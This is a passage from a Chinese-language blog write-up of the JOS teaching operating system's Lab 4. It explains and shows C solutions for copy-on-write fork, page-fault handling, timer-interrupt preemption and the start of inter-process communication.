PGSIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((((<span class="keyword">pde_t</span> *)uvpd)[PDX(addr)] &amp; PTE_P) &amp;&amp;</span><br><span class="line">            (((<span class="keyword">pte_t</span> *)uvpt)[PGNUM(addr)] &amp; PTE_P)) &#123;</span><br><span class="line">            <span class="comment">// if both page directory entry and page table entry</span></span><br><span class="line">            <span class="comment">// exist for one address(page-aligned), then call duppage</span></span><br><span class="line">            <span class="keyword">if</span> (addr == (UXSTACKTOP - PGSIZE)) &#123;</span><br><span class="line">                <span class="comment">// ignore user exception stack</span></span><br><span class="line">                <span class="comment">// for we will map a page for user exception later</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((r = duppage(child_env_id, PGNUM(addr))) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// duppage failed</span></span><br><span class="line">                <span class="comment">// destroy child environment and return</span></span><br><span class="line">                <span class="keyword">goto</span> error_handle;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// child must have its own exception stack</span></span><br><span class="line">    <span class="comment">// so alloc page and map it for child here</span></span><br><span class="line">    <span class="keyword">if</span> ((r = sys_page_alloc(child_env_id, (<span class="keyword">void</span> *)(UXSTACKTOP - PGSIZE),</span><br><span class="line">                            PTE_P | PTE_U | PTE_W)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// failed to set child environment's exception stack</span></span><br><span class="line">        <span class="comment">// destroy child environment and return</span></span><br><span class="line">        <span class="keyword">goto</span> error_handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set child's page fault handler so that parent</span></span><br><span class="line">    <span class="comment">// and child looks the same</span></span><br><span class="line">    <span class="comment">// use sys_env_set_pgfault_upcall system call</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">void</span> _pgfault_upcall(<span class="keyword">void</span>);</span><br><span class="line">    <span class="keyword">if</span> ((r = sys_env_set_pgfault_upcall(child_env_id, _pgfault_upcall)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// failed to set child's page fault upcall</span></span><br><span class="line">        <span class="comment">// destroy child environment and return</span></span><br><span class="line">        <span class="keyword">goto</span> error_handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now child is ready to run, set child to ENV_RUNNABLE</span></span><br><span class="line">    <span class="comment">// use sys_env_set_status system call</span></span><br><span class="line">    <span class="keyword">if</span> ((r = sys_env_set_status(child_env_id, ENV_RUNNABLE)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// failed to change child environment's running status</span></span><br><span class="line">        <span class="comment">// destroy child environment and return</span></span><br><span class="line">        <span class="keyword">goto</span> error_handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("fork not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> child_env_id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use goto to avoid meaningless error_handle code</span></span><br><span class="line"><span class="comment">// copy and paste everywhere</span></span><br><span class="line">error_handle:</span><br><span class="line">    <span class="keyword">if</span> (sys_env_destroy(child_env_id) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// failed either, panic then</span></span><br><span class="line">        panic(<span class="string">"failed to destroy child environment!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In lib/fork.c, duppage():</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map our virtual page pn (address pn*PGSIZE) into the target envid</span></span><br><span class="line"><span class="comment">// at the same virtual address.  If the page is writable or copy-on-write,</span></span><br><span class="line"><span class="comment">// the new mapping must be created copy-on-write, and then our mapping must be</span></span><br><span class="line"><span class="comment">// marked copy-on-write as well.  (Exercise: Why do we need to mark ours</span></span><br><span class="line"><span class="comment">// copy-on-write again if it was already copy-on-write at the beginning of</span></span><br><span class="line"><span class="comment">// this function?)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns: 0 on success, &lt; 0 on error.</span></span><br><span class="line"><span class="comment">// It is also OK to panic on error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">duppage</span><span class="params">(<span class="keyword">envid_t</span> envid, <span class="keyword">unsigned</span> pn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="keyword">int</span> perm = PTE_P | PTE_U;</span><br><span class="line">    <span class="keyword">if</span> ((((<span class="keyword">pte_t</span> *)uvpt)[pn] &amp; (PTE_W | PTE_COW))) &#123;</span><br><span class="line">        <span class="comment">// check for writable or copy-on-write page</span></span><br><span class="line">        <span class="comment">// and add perm with PTE_COW</span></span><br><span class="line">        perm |= PTE_COW;</span><br><span class="line">        <span class="comment">// NB: we also use 0 to replace thisenv-&gt;env_id</span></span><br><span class="line">        <span class="comment">// for in unix-like fork() implementation, we will copy</span></span><br><span class="line">        <span class="comment">// address space from parent process to child process</span></span><br><span class="line">        <span class="comment">// at current time, thisenv-&gt;env_id IS ABSOLUTELY WRONG</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// map from parent environment to child environment</span></span><br><span class="line">        <span class="keyword">if</span> (sys_page_map(<span class="number">0</span>, (<span class="keyword">void</span> *)(pn * PGSIZE), envid, (<span class="keyword">void</span> *)(pn * PGSIZE),</span><br><span class="line">                         perm) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            panic(<span class="string">"failed to map page from parent to child!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// remap parent's environment</span></span><br><span class="line">        <span class="keyword">if</span> (sys_page_map(<span class="number">0</span>, (<span class="keyword">void</span> *)(pn * PGSIZE), <span class="number">0</span>, (<span class="keyword">void</span> *)(pn * PGSIZE),</span><br><span class="line">                         perm) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            panic(<span class="string">"failed to remap page in parent!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// for other pages, simply map from</span></span><br><span class="line">        <span class="comment">// parent environment to child environment</span></span><br><span class="line">        <span class="keyword">if</span> (sys_page_map(<span class="number">0</span>, (<span class="keyword">void</span> *)(pn * PGSIZE), envid, (<span class="keyword">void</span> *)(pn * PGSIZE),</span><br><span class="line">                         perm) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            panic(<span class="string">"failed to map page from parent to child!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("duppage not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In lib/fork.c, pgfault():</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Custom page fault handler - if faulting page is copy-on-write,</span></span><br><span class="line"><span class="comment">// map in our own private writable copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pgfault</span><span class="params">(struct UTrapframe *utf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *   addr = (<span class="keyword">void</span> *)utf-&gt;utf_fault_va;</span><br><span class="line">    <span class="keyword">uint32_t</span> err  = utf-&gt;utf_err;</span><br><span class="line">    <span class="keyword">int</span>      r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the faulting access was (1) a write, and (2) to a</span></span><br><span class="line">    <span class="comment">// copy-on-write page.  If not, panic.</span></span><br><span class="line">    <span class="comment">// Hint:</span></span><br><span class="line">    <span class="comment">//   Use the read-only page table mappings at uvpt</span></span><br><span class="line">    <span class="comment">//   (see &lt;inc/memlayout.h&gt;).</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// use uvpt to get PTE and check premissions</span></span><br><span class="line">    <span class="keyword">if</span> (!(err &amp; FEC_WR) || !(((<span class="keyword">pte_t</span> *)uvpt)[PGNUM(addr)] &amp; PTE_COW)) &#123;</span><br><span class="line">        panic(<span class="string">"fault isn't write or PTE is not marked as PTE_COW or both!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate a new page, map it at a temporary location (PFTEMP),</span></span><br><span class="line">    <span class="comment">// copy the data from the old page to the new page, then move the new</span></span><br><span class="line">    <span class="comment">// page to the old page's address.</span></span><br><span class="line">    <span class="comment">// Hint:</span></span><br><span class="line">    <span class="comment">//   You should make three system calls.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// allocate a page and map it at PFTEMP</span></span><br><span class="line">    <span class="comment">// use sys_page_alloc system call</span></span><br><span class="line">    <span class="comment">// NB: use 0 instead of thisenv-&gt;env_id</span></span><br><span class="line">    <span class="comment">// for normally when child environment scheduled by JOS</span></span><br><span class="line">    <span class="comment">// first it tries to store 0(return value of fork()) to</span></span><br><span class="line">    <span class="comment">// local variable child_env_id on the stack</span></span><br><span class="line">    <span class="comment">// which will take a page fault and kernel will trasfer control</span></span><br><span class="line">    <span class="comment">// to pgfault here</span></span><br><span class="line">    <span class="comment">// thisenv-&gt;env_id IS ABSOLUTELY WRONG here, so use 0</span></span><br><span class="line">    <span class="comment">// and let kernel convert from 0 to correct env_id</span></span><br><span class="line">    <span class="keyword">if</span> ((r = sys_page_alloc(<span class="number">0</span>, (<span class="keyword">void</span> *)PFTEMP, PTE_P | PTE_U | PTE_W)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"failed to allocate page at temp location - %e, %x!"</span>, r,</span><br><span class="line">              thisenv-&gt;env_id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line">    <span class="comment">// use memcpy to copy from fault address's page to PFTEMP's newly</span></span><br><span class="line">    <span class="comment">// allocated page</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)PFTEMP, addr, PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use sys_page_map system call to map newly allocated</span></span><br><span class="line">    <span class="comment">// page at PFTEMP at addr with read/write permissions</span></span><br><span class="line">    <span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, (<span class="keyword">void</span> *)PFTEMP, <span class="number">0</span>, addr, PTE_P | PTE_U | PTE_W)) &lt;</span><br><span class="line">        <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"failed to map new page - %e!"</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// use sys_page_unmap system call to unmap page at</span></span><br><span class="line">    <span class="comment">// temp location PFTEMP</span></span><br><span class="line">    <span class="keyword">if</span> ((r = sys_page_unmap(<span class="number">0</span>, (<span class="keyword">void</span> *)PFTEMP)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"failed to unmap page at PFTEMP - %e!"</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("pgfault not implemented");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="第三部分-Preemptive-Multitasking-and-Inter-Process-communication-IPC-抢占式多任务和进程间通信"><a href="#第三部分-Preemptive-Multitasking-and-Inter-Process-communication-IPC-抢占式多任务和进程间通信" class="headerlink" title="第三部分 - Preemptive Multitasking and Inter-Process communication (IPC) 抢占式多任务和进程间通信"></a>第三部分 - Preemptive Multitasking and Inter-Process communication (IPC) 抢占式多任务和进程间通信</h3><p>最后一部分要求你修改内核，实现抢占式非协作环境以及允许环境显式传递信息。</p>
<h4 id="时钟中断和抢占"><a href="#时钟中断和抢占" class="headerlink" title="时钟中断和抢占"></a>时钟中断和抢占</h4><p>运行<code>user/spin</code>测试程序，该测试程序<code>fork</code>一个用户环境，生成的子环境一旦获得了CPU，就会执行一个无限循环，无论是父环境还是内核都无法重新获得CPU。<br>对于从错误和恶意代码中保护系统而言，这不是一个理想的情况，因为任何用户环境都可以通过一个无限循环以及永不放弃使得整个系统停机。为了允许内核抢占一个用户环境并强制从该环境处获取CPU的控制，需要扩展JOS内核以支持时钟硬件的外部硬件中断。</p>
<h5 id="中断规则"><a href="#中断规则" class="headerlink" title="中断规则"></a>中断规则</h5><p>外部中断（如设备中断）被称为IRQs（Interrupt request）。总共有16种可能的IRQs，分别从0编号到15。从IRQ号到IDT入口的映射并不固定。<code>picirq.c</code>中的<code>pic_init()</code>将IRQs从0到15映射到了IRQ_OFFSET到IRQ_OFFSET + 15。</p>
<p>在<code>inc/trap.h</code>中，IRQ_OFFSET被定义为32，因此IDT入口32-47对应于IRQ的0-15。例如，始终中断是IRQ 0。因此，IDT[IRQ_OFFSET + 0]包含了内核中时钟中断处理程序的地址。IRQ_OFFSET设置为32后，设备中断将不会和处理器异常号重叠。</p>
<p>同xv6 Unix相比，JOS内核提供了一个关键性简化。在内核中时，外部设备中断永远是被禁止的（但是在用户环境中是被允许的）。外部中断被%eflags寄存器的FL_IF标记控制。当该bit被设置时，外部中断被允许。尽管有若干种方式可以修改该bit位，将在进入和退出用户模式时通过保存和恢复%eflags寄存器的过程来处理它。</p>
<p>必须确保在用户环境中FL_IF标记被设置，这样当中断到达后，并且将中断传递给处理器，并由内核中的中断处理程序处理。否则中断会被屏蔽和忽略之道中断重新被允许。在引导程序的第一条指定就屏蔽了外部设备中断，并且直到目前为止，还没有重新启用。</p>
<p>练习13中遇到的问题：</p>
<ul>
<li>注意到简化规则要求中说明必须在陷入内核时将IF置0，所以必须修改之前的代码，将所有门都改为中断门</li>
</ul>
<p>练习13的代码如下，仅供参考：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In kern/trapentry.S:</span></span><br><span class="line"><span class="comment">// externel interrupts</span></span><br><span class="line">TRAPHANDLER_NOEC(irq_0_handler,  IRQ_OFFSET + <span class="number">0</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_1_handler,  IRQ_OFFSET + <span class="number">1</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_2_handler,  IRQ_OFFSET + <span class="number">2</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_3_handler,  IRQ_OFFSET + <span class="number">3</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_4_handler,  IRQ_OFFSET + <span class="number">4</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_5_handler,  IRQ_OFFSET + <span class="number">5</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_6_handler,  IRQ_OFFSET + <span class="number">6</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_7_handler,  IRQ_OFFSET + <span class="number">7</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_8_handler,  IRQ_OFFSET + <span class="number">8</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_9_handler,  IRQ_OFFSET + <span class="number">9</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_10_handler, IRQ_OFFSET + <span class="number">10</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_11_handler, IRQ_OFFSET + <span class="number">11</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_12_handler, IRQ_OFFSET + <span class="number">12</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_13_handler, IRQ_OFFSET + <span class="number">13</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_14_handler, IRQ_OFFSET + <span class="number">14</span>);</span><br><span class="line">TRAPHANDLER_NOEC(irq_15_handler, IRQ_OFFSET + <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/trap.c, trap_init():</span></span><br><span class="line"><span class="comment">// set up interupt gate descriptor</span></span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">0</span>],  <span class="number">0</span>, GD_KT, irq_0_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">1</span>],  <span class="number">0</span>, GD_KT, irq_1_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">2</span>],  <span class="number">0</span>, GD_KT, irq_2_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">3</span>],  <span class="number">0</span>, GD_KT, irq_3_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">4</span>],  <span class="number">0</span>, GD_KT, irq_4_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">5</span>],  <span class="number">0</span>, GD_KT, irq_5_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">6</span>],  <span class="number">0</span>, GD_KT, irq_6_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">7</span>],  <span class="number">0</span>, GD_KT, irq_7_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">8</span>],  <span class="number">0</span>, GD_KT, irq_8_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">9</span>],  <span class="number">0</span>, GD_KT, irq_9_handler,  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">10</span>], <span class="number">0</span>, GD_KT, irq_10_handler, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">11</span>], <span class="number">0</span>, GD_KT, irq_11_handler, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">12</span>], <span class="number">0</span>, GD_KT, irq_12_handler, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">13</span>], <span class="number">0</span>, GD_KT, irq_13_handler, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">14</span>], <span class="number">0</span>, GD_KT, irq_14_handler, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + <span class="number">15</span>], <span class="number">0</span>, GD_KT, irq_15_handler, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/env.c, env_alloc():</span></span><br><span class="line"><span class="comment">// Enable interrupts while in user mode.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">// simply use bit or to set FL_IF</span></span><br><span class="line">e-&gt;env_tf.tf_eflags |= FL_IF;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/sched.c, sched_halt():</span></span><br><span class="line"><span class="comment">// Reset stack pointer, enable interrupts and then halt.</span></span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"movl $0, %%ebp\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"movl %0, %%esp\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"pushl $0\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"pushl $0\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">// Uncomment the following line after completing exercise 13</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"sti\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"1:\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"hlt\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"jmp 1b\n"</span></span></span></span><br><span class="line">: : "a" (thiscpu-&gt;cpu_ts.ts_esp0));</span><br></pre></td></tr></table></figure></p>
<h5 id="处理时钟中断"><a href="#处理时钟中断" class="headerlink" title="处理时钟中断"></a>处理时钟中断</h5><p>在<code>user/spin</code>程序中，在子环境第一次运行后，会陷入无限循环，而内核将无法得到控制权，需要对硬件编程以定时产生时钟中断，该终端会将控制权强行切回CPU，然后可以将控制权交给另一个用户环境。</p>
<p>对于<code>lapic_init()</code>和<code>pic_init()</code>的调用已经写好，它们会设置时钟并且终端控制器会定时生成中断。需要完成代码处理这些中断。</p>
<p>练习14中遇到的问题：</p>
<ul>
<li>首先需要调用<code>lapic_eoi()</code>以确认接收到了中断，否则会一直卡住</li>
</ul>
<p>练习14的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in kern/trap.c, trap_dispatch():</span></span><br><span class="line"><span class="comment">// new code added</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_TIMER) &#123;</span><br><span class="line">    <span class="comment">// dispatch clock interupts</span></span><br><span class="line">    <span class="comment">// call sched_yield() to find and run a different environment</span></span><br><span class="line">    <span class="comment">// NB: should first call lapic_eoi() to ACKNOWLEDGE interupt</span></span><br><span class="line">    lapic_eoi();</span><br><span class="line">    sched_yield();</span><br><span class="line">    <span class="comment">// sched_yield() might not return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h4><p>到目前位置实验一直关注于操作系统的独立部分，操作系统通过虚拟化提供了一种每个环境都独占整个机器的“错觉”。然而操作系统的另一项服务是允许程序在必要的时候通讯，该功能非常强大，Unix管道就是一个典型的例子。</p>
<p>有许多进程间通讯的模型，即使是现在也有许多关于哪一种模型是最好的争论。我们不参与争论。相反，我们将实现一个简单的IPC模型。</p>
<h5 id="JOS中的IPC"><a href="#JOS中的IPC" class="headerlink" title="JOS中的IPC"></a>JOS中的IPC</h5><p>你将实现一些额外的JOS内核系统调用，这些调用共同提供一个简单的进程间通讯机制。具体的系统调用为<code>sys_ipc_recv()</code>和<code>sys_ipc_try_send()</code>，然后你将实现两个库包装<code>ipc_recv()</code>和<code>ipc_send()</code>。</p>
<p>用户环境通过JOS的IPC机制向其他环境互相发送的信息包括两部分，一个32-bit的值和一个可选的单页映射。允许环境传递页映射提供了一个比传递一个32-bit的整数更有效的数据交换方式，这也可以较为方便的设置共享内存。</p>
<h5 id="发送和接收消息"><a href="#发送和接收消息" class="headerlink" title="发送和接收消息"></a>发送和接收消息</h5><p>环境调用<code>sys_ipc_recv()</code>去接受消息。该系统调用取消调度当前环境并且直到一条消息被收到后才会被继续运行。当一个环境等待接收消息时，任何其他的环境可以向其发送一条消息 - 并不限于特定的环境，也不限于父子进程间传递消息，换言之，你在第一部分中实现的权限检查将不适用于IPC，因为IPC系统调用经过精心设计以保证安全，环境不会通过简单地发送消息而导致其他环境出现错误（除非目标环境也有错误）。</p>
<p>环境调用<code>sys_ipc_try_send()</code>去尝试发送一个值（并附带上接受者的环境ID），如果指定的环境实际上正在接受该值（已调用<code>sys_ipc_recv()</code>并且尚未获得值），则值成功发送并返回0。否则，返回-E_IPC_NOT_RECV表示目标环境当前不期望接收值。</p>
<p>用户空间的库函数<code>ipc_recv()</code>将负责调用<code>sys_ipc_recv()</code>并在当前环境的<code>struct Env</code>中查找接收值的信息。</p>
<p>用户空间的库函数<code>ipc_send()</code>将负责反复调用<code>sys_ipc_try_send()</code>直到发送成功。</p>
<h5 id="传输页"><a href="#传输页" class="headerlink" title="传输页"></a>传输页</h5><p>当一个环境以一个有效的<code>dstva</code>参数（小于UTOP）调用<code>sys_ipc_recv()</code>时，环境改变状态以表明想要接受一个页映射。如果发送者发送了一个页，那么该页将会被映射到接收者地址空间的<code>dstva</code>处。如果接收者已经在<code>dstva</code>映射了一页，那么之前的页会被解映射。</p>
<p>当一个环境以一个有效的<code>srcva</code>参数（小于UTOP）调用<code>sys_ipc_try_send()</code>时，表明发送者想要将当前映射在<code>srcva</code>的页发送给接收者，并且带有权限<code>perm</code>。在一次成功的IPC之后，发送者在其地址空间保留在<code>srcva</code>处原有的页映射，但是接收者也持有最开始由发送者指定的相同的物理页面在<code>dstva</code>的映射。最终，该页面在发送者和接收者之间共享。</p>
<p>如果发送者和接收者两者之一没有表明要传输页面，那么将不会有页面被传输。在任意一次IPC之后将接收者的<code>struct Env</code>中新的域<code>env_ipc_perm</code>设置为接受页面的权限，如果没有收到页面，则为0。</p>
<h5 id="实现IPC"><a href="#实现IPC" class="headerlink" title="实现IPC"></a>实现IPC</h5><p>练习15中遇到的问题：</p>
<ul>
<li>在<code>sys_ipc_try_send()</code>和<code>sys_ipc_recv()</code>中，均不将超过UTOP的地址标记为错误，超过UTOP的地址是无效的，但并不会导致系统调用失败</li>
<li>在<code>sys_ipc_recv()</code>中在接收到消息前将环境状态置为不可运行，那么在收到消息后，应当恢复到可运行的状态</li>
<li>在<code>sys_ipc_try_send()</code>中调用<code>page_lookup()</code>时，要记住检查的是源地址的映射，因此应当使用当前环境的页表而非接收者环境的页表</li>
</ul>
<p>练习15的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 